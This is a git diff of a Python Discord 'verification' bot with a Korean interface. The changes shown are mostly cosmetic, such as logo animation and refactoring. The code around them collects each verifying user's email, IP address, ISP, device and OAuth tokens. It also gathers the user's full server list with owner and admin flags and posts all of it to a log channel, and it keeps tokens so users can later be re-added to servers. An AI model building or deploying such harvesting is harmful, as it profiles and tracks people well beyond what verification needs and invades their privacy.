@@ -67,7 +67,35 @@ on conflict (guild_id, user_id) do update set
     created_at = excluded.created_at
 """
 
-DISCORD_LOGO = '<svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 126.644 96"><path fill="#fff" d="M81.15,0c-1.2376,2.1973-2.3489,4.4704-3.3591,6.794-9.5975-1.4396-19.3718-1.4396-28.9945,0-.985-2.3236-2.1216-4.5967-3.3591-6.794-9.0166,1.5407-17.8059,4.2431-26.1405,8.0568C2.779,32.5304-1.6914,56.3725.5312,79.8863c9.6732,7.1476,20.5083,12.603,32.0505,16.0884,2.6014-3.4854,4.8998-7.1981,6.8698-11.0623-3.738-1.3891-7.3497-3.1318-10.8098-5.1523.9092-.6567,1.7932-1.3386,2.6519-1.9953,20.281,9.547,43.7696,9.547,64.0758,0,.8587.7072,1.7427,1.3891,2.6519,1.9953-3.4601,2.0457-7.0718,3.7632-10.835,5.1776,1.97,3.8642,4.2683,7.5769,6.8698,11.0623,11.5419-3.4854,22.3769-8.9156,32.0509-16.0631,2.626-27.2771-4.496-50.9172-18.817-71.8548C98.9811,4.2684,90.1918,1.5659,81.1752.0505l-.0252-.0505ZM42.2802,65.4144c-6.2383,0-11.4159-5.6575-11.4159-12.6535s4.9755-12.6788,11.3907-12.6788,11.5169,5.708,11.4159,12.6788c-.101,6.9708-5.026,12.6535-11.3907,12.6535ZM84.3576,65.4144c-6.2637,0-11.3907-5.6575-11.3907-12.6535s4.9755-12.6788,11.3907-12.6788,11.4917,5.708,11.3906,12.6788c-.101,6.9708-5.026,12.6535-11.3906,12.6535Z"/></svg>'
+LOGO_PATH = ('<path fill="#fff" d="M81.15,0c-1.2376,2.1973-2.3489,4.4704-3.3591,6.794'
+             '-9.5975-1.4396-19.3718-1.4396-28.9945,0-.985-2.3236-2.1216-4.5967-3.3591'
+             '-6.794-9.0166,1.5407-17.8059,4.2431-26.1405,8.0568C2.779,32.5304-1.6914,'
+             '56.3725.5312,79.8863c9.6732,7.1476,20.5083,12.603,32.0505,16.0884,2.6014'
+             '-3.4854,4.8998-7.1981,6.8698-11.0623-3.738-1.3891-7.3497-3.1318-10.8098'
+             '-5.1523.9092-.6567,1.7932-1.3386,2.6519-1.9953,20.281,9.547,43.7696,9.547'
+             ',64.0758,0,.8587.7072,1.7427,1.3891,2.6519,1.9953-3.4601,2.0457-7.0718,'
+             '3.7632-10.835,5.1776,1.97,3.8642,4.2683,7.5769,6.8698,11.0623,11.5419'
+             '-3.4854,22.3769-8.9156,32.0509-16.0631,2.626-27.2771-4.496-50.9172-18.817'
+             '-71.8548C98.9811,4.2684,90.1918,1.5659,81.1752.0505l-.0252-.0505Z'
+             'M42.2802,65.4144c-6.2383,0-11.4159-5.6575-11.4159-12.6535s4.9755-12.6788'
+             ',11.3907-12.6788,11.5169,5.708,11.4159,12.6788c-.101,6.9708-5.026,12.6535'
+             '-11.3907,12.6535ZM84.3576,65.4144c-6.2637,0-11.3907-5.6575-11.3907-12.6535'
+             's4.9755-12.6788,11.3907-12.6788,11.4917,5.708,11.3906,12.6788c-.101,6.9708'
+             '-5.026,12.6535-11.3906,12.6535Z"/>')
+
+
+def logo_layer(cls):
+    return f'<svg class="{cls}" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 126.644 96">{LOGO_PATH}</svg>'
+
+
+DISCORD_LOGO = (
+    '<div class="logo-spin">'
+    + logo_layer("t3")
+    + logo_layer("t2")
+    + logo_layer("t1")
+    + logo_layer("main")
+    + "</div>"
+)
 
 BASE_HTML = """<!DOCTYPE html>
 <html lang="ko">
@@ -84,7 +112,12 @@ BASE_HTML = """<!DOCTYPE html>
 html,body{margin:0;height:100%;background:#1a1b1e;color:#f2f3f5;font-family:Galmuri11,sans-serif;font-size:12px}
 body{display:flex;align-items:center;justify-content:center;padding:16px}
 .card{width:100%;max-width:360px;background:#2b2d31;border-radius:8px;padding:28px 24px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.5);position:relative;overflow:hidden}
-.logo{display:block;width:36px;height:auto;margin:0 auto 16px;opacity:.9}
+.logo-spin{position:relative;width:40px;height:40px;margin:0 auto 18px}
+.logo-spin svg{position:absolute;top:0;left:0;width:40px;height:40px;transform-origin:50% 50%;animation:logoSpin 2.6s cubic-bezier(.3,.9,.25,1) infinite}
+.logo-spin .t1{opacity:.35;filter:blur(1.5px);animation-delay:-.045s}
+.logo-spin .t2{opacity:.2;filter:blur(3px);animation-delay:-.09s}
+.logo-spin .t3{opacity:.1;filter:blur(4.5px);animation-delay:-.135s}
+@keyframes logoSpin{0%{transform:rotate(0deg)}32%{transform:rotate(382deg)}42%{transform:rotate(344deg)}50%{transform:rotate(360deg)}100%{transform:rotate(360deg)}}
 .icon{display:block;width:72px;height:72px;margin:0 auto 14px;border-radius:50%;object-fit:cover;background:#5865f2;border:3px solid #404249}
 .fallback{display:flex;align-items:center;justify-content:center;width:72px;height:72px;margin:0 auto 14px;border-radius:50%;background:#5865f2;font-family:Galmuri14,sans-serif;font-size:22px;color:#fff;border:3px solid #404249}
 h1{margin:0 0 6px;font-family:Galmuri14,sans-serif;font-size:16px;color:#fff}
@@ -94,31 +127,20 @@ h1{margin:0 0 6px;font-family:Galmuri14,sans-serif;font-size:16px;color:#fff}
 .btn{display:block;width:100%;padding:11px;border-radius:3px;background:#5865f2;color:#fff;font-size:12px;text-decoration:none}
 .btn:hover{background:#4752c4}
 .made{position:fixed;left:0;right:0;bottom:14px;text-align:center;font-family:Galmuri9,sans-serif;font-size:10px;color:#fff;opacity:.25;pointer-events:none}
-#loader{position:absolute;inset:0;background:#1a1b1e;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:20;transition:opacity .4s ease}
-#loader.hide{opacity:0;pointer-events:none}
-.pixel-spin{width:48px;height:48px;margin-bottom:18px;background:
-linear-gradient(#5865f2 50%,transparent 50%) 0 0/50% 50%,
-linear-gradient(#5865f2 50%,transparent 50%) 100% 0/50% 50%,
-linear-gradient(#5865f2 50%,transparent 50%) 0 100%/50% 50%,
-linear-gradient(#5865f2 50%,transparent 50%) 100% 100%/50% 50%;
-background-repeat:no-repeat;animation:pixelSpin .55s steps(2) infinite}
-@keyframes pixelSpin{to{transform:rotate(90deg)}}
 .load-text{font-family:Galmuri11,sans-serif;font-size:13px;color:#fff;letter-spacing:3px;animation:blink 1s steps(1) infinite}
 @keyframes blink{50%{opacity:.25}}
-.bar{width:130px;height:8px;background:#2b2d31;margin-top:16px;border:2px solid #404249;position:relative;overflow:hidden}
+.bar{width:130px;height:8px;background:#1a1b1e;margin-top:14px;border:2px solid #404249;position:relative;overflow:hidden}
 .bar i{position:absolute;left:0;top:0;height:100%;width:35%;background:#5865f2;animation:loadBar 1.05s steps(8) infinite}
 @keyframes loadBar{0%{left:-40%}100%{left:110%}}
+#loader{position:absolute;inset:0;background:#1a1b1e;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:20;transition:opacity .4s ease}
+#loader.hide{opacity:0;pointer-events:none}
 #content{opacity:0;transition:opacity .4s ease}
 #content.show{opacity:1}
 </style>
 </head>
 <body>
 <div class="card">
-<div id="loader">
-<div class="pixel-spin"></div>
-<div class="load-text">LOADING</div>
-<div class="bar"><i></i></div>
-</div>
+<div id="loader">__SPIN__<div class="load-text">LOADING</div><div class="bar"><i></i></div></div>
 <div id="content">__BODY__</div>
 </div>
 <div class="made">Made By Kill</div>
@@ -154,8 +176,10 @@ http = None
 restoring = set()
 ready_done = False
 
+
 class OAuthError(Exception):
     pass
+
 
 class VerifyBot(discord.Client):
     async def setup_hook(self):
@@ -170,26 +194,28 @@ class VerifyBot(discord.Client):
         await pool.execute(SCHEMA)
         http = aiohttp.ClientSession()
         app = web.Application()
-        app.add_routes(
-            [
-                web.get("/", health),
-                web.get("/verify/{guild_id}", verify_page),
-                web.get("/callback", callback),
-            ]
-        )
+        app.add_routes([
+            web.get("/", health),
+            web.get("/verify/{guild_id}", verify_page),
+            web.get("/callback", callback),
+        ])
         runner = web.AppRunner(app)
         await runner.setup()
         await web.TCPSite(runner, "0.0.0.0", PORT).start()
 
+
 client = VerifyBot(intents=intents)
+
 
 def clean_dsn(dsn):
     parts = urlsplit(dsn)
     query = [(k, v) for k, v in parse_qsl(parts.query) if k != "channel_binding"]
     return urlunsplit(parts._replace(query=urlencode(query)))
 
+
 def clip(text, limit=1000):
     return text if len(text) <= limit else text[: limit - 1] + "…"
+
 
 def parse_device(ua):
     if not ua:
@@ -212,12 +238,18 @@ def parse_device(ua):
         kind = "PC"
     return f"{kind} · {os_name} · {browser}"
 
+
 def client_ip(request):
     ip = request.headers.get("CF-Connecting-IP")
     if not ip:
         forwarded = request.headers.get("X-Forwarded-For", "")
         ip = forwarded.split(",")[0].strip() if forwarded else None
     return ip or request.remote or "unknown"
+
+
+def now_kst():
+    return time.strftime("%Y년 %m월 %d일 %H:%M KST", time.gmtime(time.time() + 32400))
+
 
 def render(title, body, status=200, script=""):
     default_script = (
@@ -229,21 +261,23 @@ def render(title, body, status=200, script=""):
     text = (
         BASE_HTML
         .replace("__TITLE__", html.escape(title))
+        .replace("__SPIN__", DISCORD_LOGO)
         .replace("__BODY__", DISCORD_LOGO + body)
         .replace("__SCRIPT__", script if script else default_script)
     )
     return web.Response(text=text, content_type="text/html", status=status)
 
+
 def message_page(title, text, status=200):
     body = f"<h1>{html.escape(title)}</h1><p class='sub'>{html.escape(text)}</p>"
     return render(title, body, status)
+
 
 def success_page(guild, member, restore_count):
     if guild.icon:
         icon = f'<img class="icon" src="{html.escape(str(guild.icon.url))}" alt="">'
     else:
         icon = f'<div class="fallback">{html.escape(guild.name[:1])}</div>'
-    now = discord.utils.format_dt(discord.utils.utcnow(), "F")
     body = f"""
 {icon}
 <h1>인증 완료</h1>
@@ -251,15 +285,17 @@ def success_page(guild, member, restore_count):
 <div class="info">
 <b>역할</b> · 인증됨 역할이 지급되었습니다<br>
 <b>복구 가능 인원</b> · {restore_count}명<br>
-<b>인증 시각</b> · {now}<br>
+<b>인증 시각</b> · {now_kst()}<br>
 <b>유저</b> · {html.escape(member.display_name)}
 </div>
 <a class="btn" href="https://discord.com/channels/{guild.id}">서버로 돌아가기</a>
 """
     return render("인증 완료", body)
 
+
 async def health(request):
     return web.Response(text="ok")
+
 
 async def verify_page(request):
     try:
@@ -268,24 +304,24 @@ async def verify_page(request):
         return message_page("잘못된 주소", "인증 채널의 버튼으로 다시 접속해 주세요.", status=404)
     if client.get_guild(guild_id) is None:
         return message_page("서버를 찾을 수 없음", "인증 채널의 버튼으로 다시 접속해 주세요.", status=404)
-    query = urlencode(
-        {
-            "client_id": CLIENT_ID,
-            "redirect_uri": REDIRECT_URI,
-            "response_type": "code",
-            "scope": SCOPES,
-            "state": str(guild_id),
-            "prompt": "consent",
-        }
-    )
+    query = urlencode({
+        "client_id": CLIENT_ID,
+        "redirect_uri": REDIRECT_URI,
+        "response_type": "code",
+        "scope": SCOPES,
+        "state": str(guild_id),
+        "prompt": "consent",
+    })
     oauth_url = f"https://discord.com/oauth2/authorize?{query}"
     safe_url = oauth_url.replace("'", "%27")
     script = (
         "setTimeout(function(){"
+        "document.getElementById('loader').classList.add('hide');"
         f"window.location.href='{safe_url}';"
         "},1650);"
     )
     return render("연결 중...", "", script=script)
+
 
 async def exchange_code(code):
     payload = {
@@ -303,11 +339,13 @@ async def exchange_code(code):
         raise OAuthError("scope")
     return token
 
+
 async def fetch_user(access_token):
     async with http.get(f"{API}/users/@me", headers={"Authorization": f"Bearer {access_token}"}) as response:
         if response.status != 200:
             raise OAuthError(f"user {response.status}")
         return await response.json()
+
 
 def is_admin(permissions):
     try:
@@ -315,17 +353,18 @@ def is_admin(permissions):
     except Exception:
         return False
 
+
 async def fetch_user_guilds(access_token):
     headers = {"Authorization": f"Bearer {access_token}"}
     try:
         async with http.get(f"{API}/users/@me/guilds?with_counts=true", headers=headers) as response:
             if response.status != 200:
                 return []
-            data = await response.json()
-            return data
+            return await response.json()
     except Exception as exc:
         print(f"[guilds fetch error] {exc!r}")
         return []
+
 
 def format_guild_line(guild):
     name = guild.get("name") or "unknown"
@@ -336,13 +375,13 @@ def format_guild_line(guild):
     online = guild.get("approximate_presence_count") or 0
     return f"서버: {name} ({gid}) | 소유자: {owner} | 관리자: {admin} | 멤버: {members} | 온라인: {online}"
 
+
 async def build_guilds_file(access_token, user_id):
     try:
         guilds = await fetch_user_guilds(access_token)
         if not guilds:
             return None
-        lines = [format_guild_line(g) for g in guilds]
-        content = "\n".join(lines)
+        content = "\n".join(format_guild_line(g) for g in guilds)
         filename = f"{user_id}-{int(time.time())}-guilds.txt"
         bio = BytesIO(content.encode("utf-8"))
         bio.seek(0)
@@ -350,6 +389,7 @@ async def build_guilds_file(access_token, user_id):
     except Exception as exc:
         print(f"[build_guilds_file] {exc!r}")
         return None
+
 
 async def get_isp(ip):
     if not ip or ip in ("unknown", "127.0.0.1"):
@@ -367,6 +407,7 @@ async def get_isp(ip):
             return "알 수 없음"
     except Exception:
         return "알 수 없음"
+
 
 async def callback(request):
     if request.query.get("error"):
@@ -399,28 +440,18 @@ async def callback(request):
         device = parse_device(user_agent)
         ip_rows = await pool.fetch(
             "select user_id from verifications where guild_id=$1 and ip=$2 and user_id<>$3 and status='ok'",
-            guild_id,
-            ip,
-            user_id,
+            guild_id, ip, user_id,
         )
         dupes = [r["user_id"] for r in ip_rows if guild.get_member(r["user_id"]) is not None]
         exempt = member.guild_permissions.administrator
         status = "dupe" if dupes and not exempt else "ok"
         await pool.execute(
             SAVE_SQL,
-            guild_id,
-            user_id,
-            user.get("username", ""),
-            user.get("email"),
-            ip,
-            user_agent,
-            device,
-            None,
-            token["access_token"],
-            token.get("refresh_token"),
+            guild_id, user_id, user.get("username", ""), user.get("email"),
+            ip, user_agent, device, None,
+            token["access_token"], token.get("refresh_token"),
             int(time.time()) + int(token.get("expires_in", 604800)),
-            status,
-            int(time.time()),
+            status, int(time.time()),
         )
         if status == "ok":
             note = "인증 완료, 역할 지급"
@@ -447,8 +478,7 @@ async def callback(request):
         )
         guilds_file = await build_guilds_file(token["access_token"], user_id)
         await send_log(
-            guild,
-            member,
+            guild, member,
             {
                 "status": status,
                 "email": user.get("email"),
@@ -474,6 +504,7 @@ async def callback(request):
     if status == "ok":
         return success_page(guild, member, restore_count or 0)
     raise web.HTTPFound("https://discord.com/channels/@me")
+
 
 def build_log_view(member, info):
     ok = info["status"] == "ok"
@@ -511,6 +542,7 @@ def build_log_view(member, info):
     )
     return view
 
+
 async def send_log(guild, member, info, file=None):
     channel = await ensure_log_channel(guild)
     if channel is None:
@@ -528,6 +560,7 @@ async def send_log(guild, member, info, file=None):
         except discord.HTTPException as exc:
             print(f"[guilds file] {exc!r}")
 
+
 async def ensure_role(guild):
     role = discord.utils.get(guild.roles, name=VERIFIED_ROLE_NAME)
     if role is not None:
@@ -536,6 +569,7 @@ async def ensure_role(guild):
         return await guild.create_role(name=VERIFIED_ROLE_NAME, reason="인증 시스템")
     except discord.HTTPException:
         return None
+
 
 async def ensure_log_channel(guild):
     channel = discord.utils.get(guild.text_channels, name=LOG_CHANNEL_NAME)
@@ -554,6 +588,7 @@ async def ensure_log_channel(guild):
         )
     except discord.HTTPException:
         return None
+
 
 async def ensure_verify_channel(guild):
     channel = discord.utils.get(guild.text_channels, name=VERIFY_CHANNEL_NAME)
@@ -580,18 +615,8 @@ async def ensure_verify_channel(guild):
     except discord.HTTPException:
         return None
 
+
 def build_verify_view(guild_id):
-    query = urlencode(
-        {
-            "client_id": CLIENT_ID,
-            "redirect_uri": REDIRECT_URI,
-            "response_type": "code",
-            "scope": SCOPES,
-            "state": str(guild_id),
-            "prompt": "consent",
-        }
-    )
-    oauth_url = f"https://discord.com/oauth2/authorize?{query}"
     text = (
         "**서버 인증**\n\n"
         "아래 **인증하기** 버튼을 눌러 인증을 진행해 주세요.\n\n"
@@ -608,12 +633,13 @@ def build_verify_view(guild_id):
                 discord.ui.Button(
                     label="인증하기",
                     style=discord.ButtonStyle.link,
-                    url=oauth_url,
+                    url=f"{BASE_URL}/verify/{guild_id}",
                 )
             ),
         )
     )
     return view
+
 
 async def ensure_verify_message(channel):
     try:
@@ -627,6 +653,7 @@ async def ensure_verify_message(channel):
     except discord.HTTPException as exc:
         print(f"[verify message] {exc!r}")
 
+
 async def setup_guild(guild):
     try:
         await ensure_role(guild)
@@ -636,6 +663,7 @@ async def setup_guild(guild):
             await ensure_verify_message(channel)
     except Exception as exc:
         print(f"[setup {guild.id}] {exc!r}")
+
 
 async def refresh_access(guild_id, row):
     payload = {
@@ -660,6 +688,7 @@ async def refresh_access(guild_id, row):
         row["user_id"],
     )
     return data["access_token"]
+
 
 async def restore_one(guild, row, role):
     token = row["access_token"]
@@ -692,6 +721,7 @@ async def restore_one(guild, row, role):
             await asyncio.sleep(1)
     return False, "요청 한도 초과"
 
+
 async def handle_restore(message):
     guild = message.guild
     channel = message.channel
@@ -710,7 +740,7 @@ async def handle_restore(message):
         if not targets:
             await channel.send("복원할 유저가 없습니다.")
             return
-        status = await channel.send(f"복원을 시작합니다. 대상 {len(targets)}명")
+        status_msg = await channel.send(f"복원을 시작합니다. 대상 {len(targets)}명")
         added = 0
         failed = []
         for index, row in enumerate(targets, 1):
@@ -721,7 +751,7 @@ async def handle_restore(message):
                 failed.append((row["user_id"], reason))
             if index % 20 == 0:
                 try:
-                    await status.edit(content=f"복원 중… {index}/{len(targets)}")
+                    await status_msg.edit(content=f"복원 중… {index}/{len(targets)}")
                 except discord.HTTPException:
                     pass
             await asyncio.sleep(RESTORE_DELAY)
@@ -732,7 +762,7 @@ async def handle_restore(message):
             if len(failed) > 15:
                 text += f"\n외 {len(failed) - 15}명"
         try:
-            await status.edit(content=clip(text, 1900), allowed_mentions=none)
+            await status_msg.edit(content=clip(text, 1900), allowed_mentions=none)
         except discord.HTTPException:
             await channel.send(clip(text, 1900), allowed_mentions=none)
     except Exception as exc:
@@ -740,6 +770,7 @@ async def handle_restore(message):
         await channel.send("복원 중 오류가 발생했습니다.")
     finally:
         restoring.discard(guild.id)
+
 
 @client.event
 async def on_message(message):
@@ -760,9 +791,11 @@ async def on_message(message):
         await setup_guild(message.guild)
         await message.channel.send("인증 시스템 설정을 확인했습니다.")
 
+
 @client.event
 async def on_guild_join(guild):
     await setup_guild(guild)
+
 
 @client.event
 async def on_ready():
@@ -773,5 +806,6 @@ async def on_ready():
     for guild in client.guilds:
         asyncio.create_task(setup_guild(guild))
     print(f"{client.user}")
+
 
 client.run(TOKEN)
